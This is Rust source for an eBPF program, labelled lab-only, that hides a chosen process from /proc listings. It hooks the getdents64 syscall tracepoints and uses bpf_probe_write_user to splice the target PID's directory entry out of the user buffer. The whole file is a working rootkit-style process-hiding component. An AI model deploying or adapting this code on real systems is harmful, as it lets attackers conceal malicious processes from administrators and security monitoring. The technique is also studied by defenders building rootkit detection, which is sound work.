#![no_std]
#![no_main]
//! LAB-ONLY: hide a PID from /proc by rewriting the getdents64 result buffer.
//! On enter we capture the user buffer; on exit we splice the target
//! /proc/<pid> entry out by extending the previous record's d_reclen, using
//! the kernel-tainting bpf_probe_write_user helper.

use aya_ebpf::{
    helpers::{
        bpf_get_current_pid_tgid, bpf_probe_read_user, bpf_probe_read_user_str_bytes,
        generated::bpf_probe_write_user,
    },
    macros::{map, tracepoint},
    maps::{Array, HashMap},
    programs::TracePointContext,
};
use pidhide_common::PidName;

#[map] static BUFS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);
#[map] static TARGET: Array<PidName> = Array::with_max_entries(1, 0);
#[map] static HIDES: HashMap<u32, u64> = HashMap::with_max_entries(1, 0);

#[inline(always)]
fn bump(m: &HashMap<u32, u64>, k: u32, by: u64) {
    let n = unsafe { m.get(&k).copied().unwrap_or(0) } + by;
    let _ = m.insert(&k, &n, 0);
}

#[inline(always)]
fn eq(name: &[u8; 16], target: &[u8; 16]) -> bool {
    let mut i = 0;
    while i < 16 {
        let t = target[i];
        if t == 0 {
            return name[i] == 0;
        }
        if name[i] != t {
            return false;
        }
        i += 1;
    }
    true
}

#[tracepoint]
pub fn enter_getdents(ctx: TracePointContext) -> u32 {
    // syscalls:sys_enter_getdents64 — args: fd(@16), dirent*(@24), count(@32)
    if let Ok(dirp) = unsafe { ctx.read_at::<u64>(24) } {
        let _ = BUFS.insert(&bpf_get_current_pid_tgid(), &dirp, 0);
    }
    0
}

#[tracepoint]
pub fn exit_getdents(ctx: TracePointContext) -> u32 {
    let _ = on_exit(&ctx);
    0
}

fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
    // syscalls:sys_exit_getdents64 — ret(@16) is the number of bytes written.
    let ret: i64 = unsafe { ctx.read_at(16) }.map_err(|_| ())?;
    if ret <= 0 {
        return Ok(());
    }
    let key = bpf_get_current_pid_tgid();
    let dirp = *unsafe { BUFS.get(&key) }.ok_or(())?;
    let _ = BUFS.remove(&key);
    let target = unsafe { TARGET.get(0) }.ok_or(())?;

    let total = ret as u64;
    let mut bpos: u64 = 0;
    let mut prev: u64 = 0;
    for _ in 0..64 {
        if bpos >= total {
            break;
        }
        let addr = dirp + bpos;
        let reclen: u16 = unsafe { bpf_probe_read_user((addr + 16) as *const u16) }.map_err(|_| ())?;
        if reclen == 0 {
            break;
        }
        let mut name = [0u8; 16];
        let _ = unsafe { bpf_probe_read_user_str_bytes((addr + 19) as *const u8, &mut name) };
        if eq(&name, &target.0) && prev != 0 {
            let prev_reclen: u16 =
                unsafe { bpf_probe_read_user((prev + 16) as *const u16) }.map_err(|_| ())?;
            let merged: u16 = prev_reclen + reclen;
            unsafe {
                bpf_probe_write_user(
                    (prev + 16) as *mut core::ffi::c_void,
                    &merged as *const u16 as *const core::ffi::c_void,
                    2,
                );
            }
            bump(&HIDES, 0, 1);
        }
        prev = addr;
        bpos += reclen as u64;
    }
    Ok(())
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}
